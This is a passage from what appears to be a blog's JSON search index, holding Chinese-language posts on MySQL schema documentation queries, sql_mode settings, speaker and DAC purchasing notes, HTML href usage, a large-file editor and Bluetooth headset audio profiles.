出來<br>最後還需要產生文件<br>所以又多一倍功…做那個<br>但有時改 DB 地方，文件就會忘記改…<br>今天我手動寫出 sql<br>讓我不用太花時間方法 XD</p>\n<a id=\"more\"></a>\n<p>在 MySQL 可以下</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> <span class=\"string\">''</span> <span class=\"keyword\">as</span> <span class=\"keyword\">NO</span>,</span><br><span class=\"line\">       <span class=\"keyword\">if</span>(<span class=\"keyword\">POSITION</span>(<span class=\"string\">\"PRI\"</span> <span class=\"keyword\">IN</span> COLUMN_KEY ),<span class=\"string\">'PK'</span>,<span class=\"string\">''</span>) <span class=\"keyword\">as</span> <span class=\"string\">'標記'</span>,</span><br><span class=\"line\">       COLUMN_COMMENT <span class=\"keyword\">as</span>  <span class=\"string\">'名稱'</span>,</span><br><span class=\"line\">       COLUMN_NAME <span class=\"string\">'欄位'</span>,</span><br><span class=\"line\">       COLUMN_TYPE <span class=\"keyword\">as</span>  <span class=\"string\">'型態'</span>,</span><br><span class=\"line\">       <span class=\"keyword\">ifnull</span>(COLUMN_DEFAULT,<span class=\"string\">''</span>) <span class=\"keyword\">as</span>  <span class=\"string\">'預設值'</span>,</span><br><span class=\"line\">       <span class=\"keyword\">if</span>(IS_NULLABLE=<span class=\"string\">'YES'</span>,<span class=\"string\">'O'</span>,<span class=\"string\">''</span>) <span class=\"keyword\">as</span> <span class=\"string\">'NULL'</span>,</span><br><span class=\"line\">       <span class=\"keyword\">if</span>(EXTRA=<span class=\"string\">'auto_increment'</span>,<span class=\"string\">'O'</span>,<span class=\"string\">''</span>) <span class=\"keyword\">as</span>  <span class=\"string\">'A_I'</span>,</span><br><span class=\"line\">       TABLE_NAME,</span><br><span class=\"line\">       COLUMN_KEY</span><br><span class=\"line\"><span class=\"keyword\">FROM</span> INFORMATION_SCHEMA.COLUMNS</span><br><span class=\"line\"><span class=\"keyword\">WHERE</span> TABLE_SCHEMA = <span class=\"string\">'ooo'</span>  <span class=\"keyword\">AND</span> TABLE_NAME = <span class=\"string\">'xxx'</span></span><br></pre></td></tr></table></figure>\n<p>不過在<code>INFORMATION_SCHEMA.COLUMNS</code>沒有設定 index<br>所以通常正式環境有很多 table 還是不要亂用比較好<br>可以直接複製出來貼到 WORD</p>\n<p>INFORMATION_SCHEMA.COLUMNS 相關欄位資訊<br>參考:<a href=\"https://www.cnblogs.com/timxgb/p/7862929.html\" target=\"_blank\" rel=\"noopener\">mysql 的 TABLE_SCHEMA 的 sql 和 information_schema 表, MySQL 管理一些基礎 SQL 語句, Changes in MySQL 5.7.2 - t6 - 博客園</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">SCHEMATA表：提供了關於數據庫的信息。</span><br><span class=\"line\">TABLES表：給出了關於數據庫中的表的信息。</span><br><span class=\"line\">COLUMNS表：給出了表中的列信息。</span><br><span class=\"line\">STATISTICS表：給出了關於表索引的信息。</span><br><span class=\"line\">USER_PRIVILEGES表：給出了關於全程權限的信息。該信息源自mysql.user授權表。</span><br><span class=\"line\">SCHEMA_PRIVILEGES表：給出了關於方案（數據庫）權限的信息。該信息來自mysql.db授權表。</span><br><span class=\"line\">TABLE_PRIVILEGES表：給出了關於表權限的信息。該信息源自mysql.tables_priv授權表。</span><br><span class=\"line\">COLUMN_PRIVILEGES表：給出了關於列權限的信息。該信息源自mysql.columns_priv授權表。</span><br><span class=\"line\">CHARACTER_SETS表：提供了關於可用字符集的信息。</span><br><span class=\"line\">COLLATIONS表：提供了關於各字符集的對照信息。</span><br><span class=\"line\">COLLATION_CHARACTER_SET_APPLICABILITY表：指明了可用於校對的字符集。</span><br><span class=\"line\">TABLE_CONSTRAINTS表：描述了存在約束的表。</span><br><span class=\"line\">KEY_COLUMN_USAGE表：描述了具有約束的鍵列。</span><br><span class=\"line\">ROUTINES表：提供了關於存儲子程序（存儲程序和函數）的信息。此時，ROUTINES表不包含自定義函數（UDF）。</span><br><span class=\"line\">VIEWS表：給出了關於數據庫中的視圖的信息。</span><br><span class=\"line\">TRIGGERS表：提供了關於觸發程序的信息。</span><br></pre></td></tr></table></figure>\n<p>相關資料:</p>\n<ul>\n<li><a href=\"https://dev.mysql.com/doc/refman/5.7/en/information-schema-optimization.html\" target=\"_blank\" rel=\"noopener\">MySQL :: MySQL 5.7 Reference Manual :: 8.2.3 Optimizing INFORMATION_SCHEMA Queries</a></li>\n<li><a href=\"https://www.cnblogs.com/timxgb/p/7862929.html\" target=\"_blank\" rel=\"noopener\">mysql 的 TABLE_SCHEMA 的 sql 和 information_schema 表, MySQL 管理一些基礎 SQL 語句, Changes in MySQL 5.7.2 - t6 - 博客園</a></li>\n<li><a href=\"https://stackoverflow.com/questions/7233703/how-do-i-find-out-which-tables-have-no-indexes-in-mysql\" target=\"_blank\" rel=\"noopener\">sql - How do I find out which tables have no indexes in MySQL - Stack Overflow</a></li>\n</ul>\n","categories":["寫程式一些事"],"tags":["mysql","docs"]},{"title":"買S360DB喇吧與需不需要買 DAC 小記","url":"/blog/2021/02/28/%E8%B2%B7S360DB%E5%96%87%E5%90%A7%E8%88%87%E9%9C%80%E4%B8%8D%E9%9C%80%E8%A6%81%E8%B2%B7-DAC-%E5%B0%8F%E8%A8%98/","content":"<p>最近購買 S360DB 喇叭<br>有做一些筆記<br>方便以後來查詢<br>本內容是我從網路上整理的<br>因為我不是專業人士，特別整理網路上資訊<br>所以可能會有些錯誤</p>\n<a id=\"more\"></a>\n<h2 id=\"我使用喇叭經歷\"><a href=\"#我使用喇叭經歷\" class=\"headerlink\" title=\"我使用喇叭經歷\"></a>我使用喇叭經歷</h2><p>我以前用 N 牌塑膠便宜喇叭…</p>\n<p>高中有用過三洋 1000 塊 木質喇叭<br>後來 ALTEC VS-4621 買(再特價3000時候買)<br>最近幾年看發現原來停產了…<br>所以當初5000~6000喇叭都降價</p>\n<p>最近 ALTEC VS-4621 喇叭壞掉(左邊衛星喇叭沒聲音)<br>找不到哪邊有修理，只能換喇叭<br>最近換 S360DB 喇叭</p>\n<h2 id=\"喇叭推薦選擇\"><a href=\"#喇叭推薦選擇\" class=\"headerlink\" title=\"喇叭推薦選擇\"></a>喇叭推薦選擇</h2><p>建議還是看<a href=\"https://forum.gamer.com.tw/C.php?page=1&amp;bsn=60030&amp;snA=546968\" target=\"_blank\" rel=\"noopener\">【心得】0~10萬 個人偏愛喇叭推薦 購買 基礎概念分享~ @電腦應用綜合討論 哈啦板 - 巴哈姆特</a><br>專業又豐富…</p>\n<p>我桌子比較大，所以我選擇 S360DB<br>雖然放這兩顆還是感覺很大<br>不過買的時候，建議看一下重低音是否放得下<br>重低音深度還滿大的…</p>\n<p>我朋友因為桌子比較小，選 Aego 3 2.1</p>\n<p>實體店我是去勝鋒光華喇叭專賣店<br>那邊襬的喇叭還算不錯<br>老闆還算滿專業<br>我朋友挑 Aego 3 2.1 老闆有講這個喇叭缺點電腦關機會有抵躁(老闆自己講的)<br>跟網路上講得一樣，線材可以升級還有保固</p>\n<p>這邊簡單說一下，我使用 S360DB 感想<br>目前剛來的時候， 30%音量就覺得很大聲<br>所以怕吵的可能不推薦買這種喇叭<br>因為這種喇叭要開大聲比較好<br>然後 玩遊戲、看電影我會開 50% 音量(電腦的)<br>音樂聽 Hi-RES 音質比較好<br>遊戲環繞超讚，看動畫影片聲音分離很開<br>是一種不同的感受，聽得很有環繞效果</p>\n<p>缺點嗎? 喇叭看不到轉多少音量，其實我以前還滿固定看喇叭旋轉音量<br>但現在無法看到，說明書也沒說明，有問客服有無法看的方法</p>\n<blockquote>\n<p>1.喇叭聲音的段數是屬於微調性質 因此沒有特別分段<br>2.看不到調多大</p>\n<p>說明：當喇叭連接手機藍芽，這時音量會跟手機連動，也就是只有一個音量控制，不會手機音量開到80%，喇叭音量開到30%的多頭馬車現象。</p>\n</blockquote>\n<h2 id=\"可能要懂得喇叭知識\"><a href=\"#可能要懂得喇叭知識\" class=\"headerlink\" title=\"可能要懂得喇叭知識\"></a>可能要懂得喇叭知識</h2><h3 id=\"被動式喇叭和主動式喇叭\"><a href=\"#被動式喇叭和主動式喇叭\" class=\"headerlink\" title=\"被動式喇叭和主動式喇叭\"></a>被動式喇叭和主動式喇叭</h3><blockquote>\n<p>喇叭分為主動與被動  其最大差異為<br>是否內置擴大電路～</p>\n<p>主動式喇叭內建擴大機（電路）  因此只要有<br>音源(類比聲音) 或是訊源( 數位 例如光纖 同軸 USB介面….注意不是所有主動式都內建dac) 即可發聲…..</p>\n<p>被動式喇叭 代表必須額外接擴大機  DAC  線材…等等 （前端器材得以外接） 因此用料與價格等級規格可以依據自己口袋深度大幅度提高…..所以音質可提升空間主動式喇叭</p>\n</blockquote>\n<p>參考: <a href=\"https://forum.gamer.com.tw/C.php?page=1&amp;bsn=60030&amp;snA=546968\" target=\"_blank\" rel=\"noopener\">【心得】0~10萬 個人偏愛喇叭推薦 購買 基礎概念分享~ @電腦應用綜合討論 哈啦板 - 巴哈姆特</a></p>\n<h3 id=\"RCA\"><a href=\"#RCA\" class=\"headerlink\" title=\"RCA\"></a>RCA</h3><p>簡單來說就是1(3.5mm) 轉 2同軸<br>Google 一下應該就知道</p>\n<h3 id=\"DAC-DDC-音效卡-SPDIF\"><a href=\"#DAC-DDC-音效卡-SPDIF\" class=\"headerlink\" title=\"DAC,DDC,音效卡,SPDIF\"></a>DAC,DDC,音效卡,SPDIF</h3><p>專業文<a href=\"https://forum.gamer.com.tw/C.php?bsn=60030&amp;snA=469798\" target=\"_blank\" rel=\"noopener\">【心得】迷思破解 音效卡? DAC?耳擴(擴大機)? 電源?聲音好壞?數位化聲音? @電腦應用綜合討論 哈啦板 - 巴哈姆特</a><br>我其實看不是很懂…(冒汗)</p>\n<h4 id=\"DAC-DDC-音效卡\"><a href=\"#DAC-DDC-音效卡\" class=\"headerlink\" title=\"DAC,DDC,音效卡\"></a>DAC,DDC,音效卡</h4><p>之前看影片，我覺得 DAC 和音效卡就是一樣的東西<br>網路上還是有找到差異</p>\n<blockquote>\n<p>問:USB DAC是否可以取代音效卡?<br>答:不能完全取代!因為一般USB DAC無如MIC/LINE IN等功能<br>         如果不使用麥克風或類比輸入的情況下<br>         你只是要單純接NB或PC聽2聲道音樂就可以算取代音效卡</p>\n<p>問:DAC是否可以取代音效卡?<br>答:DAC無法取代音效卡~因為DAC不是要取代音效卡<br>         DAC需要接音效卡的數位訊號輸出轉出類比2聲道<br>         提升原本聲音的品質~彼此是搭配互補的關係!</p>\n</blockquote>\n<p>參考: <a href=\"http://cckckimo.topshop.com.tw/News_Detail.aspx?ID=dd55d8dc-a7fc-480f-8267-81889e7906a3\" target=\"_blank\" rel=\"noopener\">音樂達人專業賣場</a></p>\n<p>DDC 目前看好像沒有解音效卡功能<br>在USB DAC 沒普及之前<br>中間需要用這個樣子<br>如我下面想找 USB DDC 但沒找到<br>有些音效卡上面有 SPDIF 輸出<br>代表有 DDC 功能(我看到有偏有人這樣講)</p>\n<h4 id=\"SPDIF-光纖\"><a href=\"#SPDIF-光纖\" class=\"headerlink\" title=\"SPDIF 光纖\"></a>SPDIF 光纖</h4>\n<p>光華找不到<br>露天也只剩一家在賣…</p>\n<p>我當初看 SPDIF 一直以為音效卡上面有 SPDIF 就以為音效卡會處理<br>但其實裝置輸入再SPDIF 輸出，音效卡不會做額外加工<br>可能送到喇叭 SPDIF 裡面會是最好的方案</p>\n<p>光纖要注意線的頻率，對應喇叭和 DAC 是否有支援<br>如: 24bit/192歐</p>\n<h3 id=\"正常喇叭轉換過程\"><a href=\"#正常喇叭轉換過程\" class=\"headerlink\" title=\"正常喇叭轉換過程\"></a>正常喇叭轉換過程</h3><img src=\"/blog/2021/02/28/買S360DB喇吧與需不需要買-DAC-小記/img1.png\" title=\"title\">\n<p>圖示參考: <a href=\"https://www.youtube.com/watch?v=Utcf7X0pJAA\" target=\"_blank\" rel=\"noopener\">亞當開箱｜音效卡分享 SoundBlaster G6、X3，聆聽模式&amp;均衡響度，吃雞神器！ - YouTube</a><br>推薦可以看一下上面影片</p>\n<h3 id=\"喇叭需要關機嗎\"><a href=\"#喇叭需要關機嗎\" class=\"headerlink\" title=\"喇叭需要關機嗎?\"></a>喇叭需要關機嗎?</h3><p>之前我使用 vs4621 我就沒有關機<br>因為他做那邊不好關機<br>網路上也有正反兩派</p>\n<p>這次我問店家老闆，老闆說正常不到 100wa 的喇叭可以不用<br>e235 重低音就需要關，老闆說他的 wa 數比較高，關掉才比較不會發熱</p>\n<h2 id=\"S360DB-整理\"><a href=\"#S360DB-整理\" class=\"headerlink\" title=\"S360DB 整理\"></a>S360DB 整理</h2><h3 id=\"該不該買-DAC\"><a href=\"#該不該買-DAC\" class=\"headerlink\" title=\"該不該買 DAC\"></a>該不該買 DAC</h3><p>先講結論，不推薦</p>\n<p>當初買 S360DB 很怕喇叭推不動<br>所以有再看是否要買音效卡<br>後來查了一推資料<br>原本想購買如下順續<br>SPDIF(1) =&gt; ASUS 音效卡(2) =&gt; G6(3)=&gt; 放棄購買 DAC (4)  –&gt; DDC(5)</p>\n<p>(1) 當初想買這個，想說主機板有支援<br>想說直接數位輸出，但這個要拆主機板<br>這點我就很懶…<br>因為我家插座沒接地線<br>所以怕會引響喇叭有雜音…<br>之前 3.5mm 喇叭現有特別換大通線<br>減少雜音</p>\n<p>(2) 聽說買這個，通常音效卡有做電力保護<br>所以比較不會聽到雜音<br>但網路上找不到 ASUS 配 S360DB</p>\n<p>(3)-&gt;(4)<br>看這篇有推薦<a href=\"https://www.youtube.com/watch?v=Utcf7X0pJAA\" target=\"_blank\" rel=\"noopener\">亞當開箱｜音效卡分享 SoundBlaster G6、X3，聆聽模式&amp;均衡響度，吃雞神器！ - YouTube</a><br>這個 G6 和 S360DB 在巴哈就有人討論是否要搭著用</p>\n<ul>\n<li><p><a href=\"https://m.gamer.com.tw/forum/C.php?bsn=60030&amp;snA=515456\" target=\"_blank\" rel=\"noopener\">【問題】請問一下外接G6音效卡的問題… @電腦應用綜合討論 哈啦板 - 巴哈姆特</a><br>這篇還滿值的參考<br>有兩個大神在激辯，不過當時看這篇還看不是很懂<br>反正最後不推薦使用 DAC</p>\n</li>\n<li><p><a href=\"https://m.gamer.com.tw/forum/C.php?bsn=60030&amp;snA=512689&amp;bpage=0&amp;ltype=&amp;page=2\" target=\"_blank\" rel=\"noopener\">RE:音效卡 資訊整合 分享 @電腦應用綜合討論 哈啦板 - 巴哈姆特</a><br>第 18 樓可以參考</p>\n</li>\n<li><p><a href=\"https://www.ptt.cc/bbs/Audiophile/M.1563109677.A.00B.html\" target=\"_blank\" rel=\"noopener\">Re: [問題] 光纖和3.5真的有差嗎？ - 看板 Audiophile - 批踢踢實業坊</a></p>\n</li>\n<li><a href=\"https://m.gamer.com.tw/forum/C.php?bsn=60030&amp;snA=536463\" target=\"_blank\" rel=\"noopener\">【閒聊】關於漫步者喇叭的一些雜談與音效卡/DAC購置與否~ @電腦應用綜合討論 哈啦板 - 巴哈姆特</a></li>\n</ul>\n<p>(5)<br>後來，我還是很想知道光纖音質<br>想說有沒有 USB 兔出光纖<br>後來有找到 1000 塊這種，但規格只有到 16/48歐<br>買不對頻率會降頻(參考:<a href=\"https://www.ptt.cc/bbs/Headphone/M.1531998629.A.401.html\" target=\"_blank\" rel=\"noopener\">[討論] DDC跟DAC解析不同 以哪個為主？ - 看板 Headphone - 批踢踢實業坊</a>)</p>\n<p>喇叭有支援到 24/192歐<br>後來疑似有找到有支援的</p>\n<ul>\n<li><a href=\"https://24h.m.pchome.com.tw/prod/DMAA5E-A900AL0AW\" target=\"_blank\" rel=\"noopener\">CYP西柏 - 專業級 192KHz 高音質USB轉光纖 (Optical) 轉換盒 CDB-6 - PChome 24h購物</a></li>\n<li><a href=\"https://www.ruten.com.tw/item/show?22052417475694#info\" target=\"_blank\" rel=\"noopener\">第二代 XMOS XU208異步 USB轉同軸光纖數字界面 1000MIPS DSD256 | 露天拍賣</a></li>\n</ul>\n<p>但文獻太少…又不便宜，所以我放棄<br><strong>最後還是乖乖用 RCA </strong></p>\n<p><code>最後有爬到有一個 DDC 比較有文獻</code><br>谷津 DA&amp;T C14<br><a href=\"https://m.mobile01.com/topicdetail.php?f=180&amp;t=3178631\" target=\"_blank\" rel=\"noopener\">谷津 U1 &amp; c-11(usb轉同軸) &amp; 電源濾波器 - Mobile01</a></p>\n<p>題外話，我朋友是站在買 DAC 這一塊<br>聲音多多少少傳到 S360DB 轉換一次還是不一樣(但網路上說CP質不高)<br>我朋友之前有買 SONY PHA-1A<br>他覺得音樂有變比較好(以上存個人感受)<br>但我覺得大多文獻都是不推薦的，因為變化不大<br>假如你覺得不好可以買買看</p>\n<p>看著看著 SONY PHA-1A 停產啦，好像CP直比較高的DAC 是 Q5S(能USB接電腦，開藍芽走LDAC…)<br>國外有USB type c 版本，台灣沒有賣的樣子<br>這又是另一個坑，目前還沒打算買</p>\n<p>最近花了很多心力在研究<br>把一些重點都記錄出來<br>怕我下次買喇叭又要重新找資料<br>希望能順便幫到有要買的人</p>\n","categories":["Windows"],"tags":["s360db","spdif"]},{"title":"超連結href=#和href=javascript:void(0)差別 & href和src不一樣的地方","url":"/blog/2019/02/27/%E8%B6%85%E9%80%A3%E7%B5%90href-%E5%92%8Chref-javascript-void-0-%E5%B7%AE%E5%88%A5-href%E5%92%8Csrc%E4%B8%8D%E4%B8%80%E6%A8%A3%E7%9A%84%E5%9C%B0%E6%96%B9/","content":"<p>之前很常看到網頁做不做跳頁超連結都用<code>href=&quot;#&quot;</code><br>也有看過更早的程式用<code>javascript:void(0);</code><br>但也沒有深入這兩個的差別<br>當然知道<code>#</code>有錨點功能，但說真的也不知道這樣用會有什麼缺點<br><a href=\"https://kknews.cc/zh-tw/tech/ena88ry.html\" target=\"_blank\" rel=\"noopener\">神奇的 html 錨點，讓你的網頁在內部自由的跳轉 - 每日頭條</a><br>之前有看過一篇<a href=\"https://blog.miniasp.com/post/2018/09/22/Angular-template-with-hash-link-problem\" target=\"_blank\" rel=\"noopener\">在 Angular 套版時應注意多層次選單超連結的使用 | The Will Will Web</a><br>今天就小記一下，不然怕之忘了很難找</p>\n<a id=\"more\"></a>\n<h2 id=\"href-javascript-void-0-javascript\"><a href=\"#href-javascript-void-0-javascript\" class=\"headerlink\" title=\"href,javascript:void(0),javascript:;\"></a>href,javascript:void(0),javascript:;</h2><blockquote>\n<p>我們一般比較常見的寫法有幾種：</p>\n<ul>\n<li>直接使用 # 當作超連結<br>這種技巧對於靜態版型還可行，許多網頁設計師也很習慣這樣寫，但是當使用者點擊連結後，卻會在目前網址後方加上一個 # 符號。一來，我個人相當不喜歡這種作法，因為網址會發生改變；二來，這種寫法會讓 SPA (單一頁面應用程式) 的路由發生異常，所以應該避免。</li>\n<li>使用特殊的 javascript:void(0) 當作超連結<br>這種寫法通常是前端工程師以及對 UX 特別要求的設計師愛用，原因無他，就是網址列不會出現怪怪的 # 符號。這種寫法同時也對 SPA 網頁應用程式相當友善，所以推薦使用。但唯一的缺點，就是比 # 多打太多字了！</li>\n<li>使用特殊的 javascript:; 當作超連結<br>這種寫法跟 javascript:void(0) 如出一轍，但硬是少打了 6 個字元，如果學會他，你這輩子可能有機會打超過 1000 次這種連結，就可以少打 6000 個按鍵，不無小補啦。</li>\n</ul>\n</blockquote>\n<p>以上來自:<a href=\"https://blog.miniasp.com/post/2018/09/22/Angular-template-with-hash-link-problem\" target=\"_blank\" rel=\"noopener\">在 Angular 套版時應注意多層次選單超連結的使用 | The Will Will Web</a></p>\n<h2 id=\"src-href\"><a href=\"#src-href\" class=\"headerlink\" title=\"src href\"></a>src href</h2><p>這之前也有看過類似文章<br>但今天忘了，剛好又看到有人討論這個問題<br>當出學 HTML 也是用記得，沒有想到這個問題</p>\n<p><a href=\"https://www.facebook.com/groups/110635703123103/permalink/361861428000528/?comment_id=361918307994840&amp;comment_tracking=%7B%22tn%22%3A%22R%22%7D\" target=\"_blank\" rel=\"noopener\">六角學院 - 學員社團</a><br><a href=\"https://stackoverflow.com/questions/3395359/difference-between-src-and-href?fbclid=IwAR19QTM94zHMAXPawqr9i_sWKF7-UXD6b9WWRf-aLNorxSAWpctLPz2B2mc\" target=\"_blank\" rel=\"noopener\">html - Difference between SRC and HREF - Stack Overflow</a></p>\n<blockquote>\n<p>另外依據文內資訊，在載入頁面時，此兩者個運作行為會有差別。<br>具體而言，瀏覽器會依據 html 的內容依序載入元素，由於 src 本身即為元素之一，因此瀏覽器會等 src 的內容完整抓取之後才繼續載入後續元素。然而 href 只是連結，瀏覽器並不會去載入 href 的任何內容。<br>這就是爲什麼 CSS 是用 href，但是 javascript 卻是用 src</p>\n</blockquote>\n","categories":["HTML"],"tags":["href","src"]},{"title":"遇到Data truncated for column 'd' at row 和改sql_mode那些事","url":"/blog/2018/09/01/%E9%81%87%E5%88%B0Data-truncated-for-column-d-at-row-%E5%92%8C%E6%94%B9sql-mode%E9%82%A3%E4%BA%9B%E4%BA%8B/","content":"<p>最近公司報表出問題了<br>繼上次DB還原<a href=\"https://malagege.github.io/blog/2018/08/28/MySQL%E5%9C%A8Linux%E4%B8%8B%E9%A0%90%E8%A8%AD%E6%9C%89%E5%88%86%E5%A4%A7%E5%B0%8F%E5%AF%AB%E5%92%8CIncorrect-integer-value-for-column-num-%E5%95%8F%E9%A1%8C/\">MySQL在Linux下預設有分大小寫和Incorrect integer value: ‘’ for column ‘num’ 問題 | 程式狂想筆記</a>，有些設定跑掉<br>這次出現這個<code>Data truncated for column &#39;d&#39; at row</code><br>因為重新設定還原sql_mode是嚴格模式…</p>\n<a id=\"more\"></a>\n<p>為什麼這次會出現<code>Incorrect integer value: &#39;&#39; for column &#39;num&#39;</code><br>不知道這次也是Excel匯入也出現<code>Data truncated for column &#39;d&#39; at row</code><br>為什麼有不一樣的結果呢??<br>發現帶入空字串輸入到double會發這種事情…<br>導致可能前人寫的Excel匯入會有狀況</p>\n<p>有簡單用docker hub pwd(play with docker)測試<br><img src=\"/blog/2018/09/01/遇到Data-truncated-for-column-d-at-row-和改sql-mode那些事/error.jpg\" title=\"title\"></p>\n<p>簡單記錄測試紀錄<br>再開嚴格模式<br><code>&#39;1&#39;</code>都可以正常存入，但前後多不明空白會不能寫入<br>但沒開嚴格模式時候<br><code>&#39; 1&#39;</code>不能正常寫入<br><code>&#39;1 &#39;</code>可以正常寫入<br>當然他也沒有很聰明<code>&#39;&#39;</code>跟<code>&#39;NULL&#39;</code>會變NULL</p>\n<p>可能要改sql_mode改成沒嚴格模式<br>不過嚴格模式，主管擔心要重啟MySQL<br>所以也不能隨意重啟orz</p>\n<p>最後網路上有爬到<a href=\"https://xyz.cinc.biz/2013/08/mysql-server-sql-modes.html\" target=\"_blank\" rel=\"noopener\">XYZ的筆記本: MySQL Server 的 SQL Modes</a></p>\n<blockquote>\n<p>SQL Modes 預設值：<br>在 5.6.5 和之前的版本，預設值是空的，沒有設置。<br>在 5.6.6 和之前的版本，預設值是 NO_ENGINE_SUBSTITUTION。<br>查詢目前 SQL Modes 目前的設定：<br>SELECT @@GLOBAL.sql_mode;<br>SELECT @@SESSION.sql_mode;<br>GLOBAL.sql_mode 是目前伺服器的設定值，SESSION.sql_mode 是目前連線的設定值<br>設定 SQL Modes 方法有以下三種：<br>1.修改設定檔(my.cnf或my.ini)中的 sql-mode=”設定值”<br>2.MySQL啟動時，加參數 –sql-mode=”設定值”<br>3.連線登入後修改<br>SET GLOBAL sql_mode=’設定值’;<br>SET SESSION sql_mode=’設定值’;<br>GLOBAL 是修改目前伺服器的設定值，SESSION 是修改目前連線的設定值</p>\n</blockquote>\n<p>看到下面的<code>3.連線登入修改</code>，就謝天謝地<br>當然也要注意重新啟動，記得要改my.cnf</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"># /etc/mysql/my.cnf</span><br><span class=\"line\"></span><br><span class=\"line\">[mysqld] </span><br><span class=\"line\">sql_mode = NO_ENGINE_SUBSTITUTION</span><br></pre></td></tr></table></figure>\n<p>不用這個方法改code不知改道何時才會改完…</p>\n<p>最後新專案開發用到MySQL還是啟用<br>比較不會出問題<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">[mysqld]</span><br><span class=\"line\">sql_mode=&apos;ONLY_FULL_GROUP_BY,NO_AUTO_VALUE_ON_ZERO,STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,</span><br><span class=\"line\">ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION,PIPES_AS_CONCAT,ANSI_QUOTES&apos;</span><br></pre></td></tr></table></figure></p>\n<p>參照來源:<a href=\"http://xstarcd.github.io/wiki/MySQL/MySQL-sql-mode.html\" target=\"_blank\" rel=\"noopener\">mysql的sql_mode合理设置</a></p>\n<p>感覺比較不會出甚麼嚴重問題</p>\n","categories":["MySQL"],"tags":["mysql","sql"]},{"title":"開啟大檔案的好用工具PilotEditLite","url":"/blog/2019/05/11/%E9%96%8B%E5%95%9F%E5%A4%A7%E6%AA%94%E6%A1%88%E7%9A%84%E5%A5%BD%E7%94%A8%E5%B7%A5%E5%85%B7PilotEditLite/","content":"<p>最近要匯入大量 sql<br>檔案有大到超過 3G<br>Sublime,vscode 都不適合開大檔案<br>所以網路爬了工具<br>記錄一下</p>\n<a id=\"more\"></a>\n<h2 id=\"PilotEdit\"><a href=\"#PilotEdit\" class=\"headerlink\" title=\"PilotEdit\"></a>PilotEdit</h2><p>PilotEdit 有免費的!!但超過 400GB 就需要錢了(我有生之年會遇到??)<br><a href=\"https://www.azofreeware.com/2015/06/pilotedit.html\" target=\"_blank\" rel=\"noopener\">PilotEdit Lite 12.6.0 中文版 - 支援超大檔案的文字編輯軟體 - 阿榮福利味 - 免費軟體下載</a></p>\n<p>不過預設開啟檔案不是 UTF8<br>可能需要調整一下<br><code>編輯</code>→<code>改變檔編碼</code><br>可調整編碼</p>\n<img src=\"/blog/2019/05/11/開啟大檔案的好用工具PilotEditLite/1.png\" title=\"調整編碼\">\n<p>第二個選項一定要勾，第一個選項看你之後開的檔案編碼是不是一樣<br>假如是的話可以打勾</p>\n<h2 id=\"其他工具\"><a href=\"#其他工具\" class=\"headerlink\" title=\"其他工具\"></a>其他工具</h2><p>EmEditor 要錢!!不是免費的<br><a href=\"https://zh-tw.emeditor.com/\" target=\"_blank\" rel=\"noopener\">EmEditor (文字編輯器) – 支持大檔案以及 Unicode 的最佳 Windows 編輯器!</a></p>\n<p><a href=\"https://www.zhihu.com/question/19688121/answer/63245703\" target=\"_blank\" rel=\"noopener\">windows 下如何查看超大文本文件(5G ) - 知乎</a><br>裡面有提到</p>\n<ol>\n<li>WINHEX</li>\n<li>glogg</li>\n</ol>\n<p>glogg 有時間再用用看</p>\n","categories":["實用工具"],"tags":["software"]},{"title":"電腦使用藍芽耳機時候不能聽到電腦音樂(或其他聲音)","url":"/blog/2020/11/12/%E9%9B%BB%E8%85%A6%E4%BD%BF%E7%94%A8%E8%97%8D%E8%8A%BD%E8%80%B3%E6%A9%9F%E6%99%82%E5%80%99%E4%B8%8D%E8%83%BD%E8%81%BD%E5%88%B0%E9%9B%BB%E8%85%A6%E9%9F%B3%E6%A8%82-%E6%88%96%E5%85%B6%E4%BB%96%E8%81%B2%E9%9F%B3/","content":"<p>最近帶 SONY WH1000MX4 電腦聽音樂使用語音聊天<br>發現聲音沒有聽到音樂，後來發現聲音有兩個裝置</p>\n<p>輸出</p>\n<ol>\n<li>WH-1000XM4 Stereo</li>\n<li>WH-1000XM4 Hands-Free AG Audio</li>\n</ol>\n<p>麥克風是</p>\n<ol>\n<li>WH-1000XM4 Hands-Free AG Audio</li>\n</ol>\n<a id=\"more\"></a>\n<p>簡單來說使用<code>WH-1000XM4 Stereo</code>不能使用麥克風….<br>要全不聽到聲音跟別人聊天需要設定預設輸出<code>WH-1000XM4 Hands-Free AG Audio</code><br>但缺點音樂品質不是很好</p>\n<p>為什麼會這樣限制，好像跟藍芽傳輸頻寬有關係</p>\n<p>通常我們使用手機耳機聽音樂，有人打電話來，音樂會暫停<br>但在 Windows 10 不會，不知道有什麼方法可以在 Window 10 切換?<br>看到有「預設通訊裝置」，但預設不會切換；耶不會關掉音樂</p>\n<p>又看到官網介紹<a href=\"https://helpguide.sony.net/mdr/wh1000xm4/v1/zh-tw/contents/TP1000029161.html\" target=\"_blank\" rel=\"noopener\">WH-1000XM4 | 說明指南 | 在電腦上進行視訊通話</a></p>\n<p>網路上有用 powershell 指令切換 <a href=\"https://www.zhihu.com/question/46880208\" target=\"_blank\" rel=\"noopener\">win10连接蓝牙耳机不能语音，是否有解决办法？ - 知乎</a></p>\n<p>簡單來說只有這兩種選澤</p>\n<ol>\n<li>WH-1000XM4 Hands-Free AG Audio,WH-1000XM4 Hands-Free AG Audio</li>\n<li>WH-1000XM4 Stereo</li>\n</ol>\n<p>手動切換，好像無法自動切換麥克風(WH-1000XM4 Hands-Free AG Audio)</p>\n","categories":["電腦知識"],"tags":["藍芽"]},{"title":"顯示一個資料夾全部檔案路徑","url":"/blog/2019/01/09/%E9%A1%AF%E7%A4%BA%E4%B8%80%E5%80%8B%E8%B3%87%E6%96%99%E5%A4%BE%E5%85%A8%E9%83%A8%E6%AA%94%E6%A1%88%E8%B7%AF%E5%BE%91/","content":"<p>最近要抓一個資料夾所有檔案路徑<br>在想有什麼方法可以一次快速搞定?<br>所以我想一個笨方法<br>就是新增 git</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git add *</span><br><span class=\"line\">git 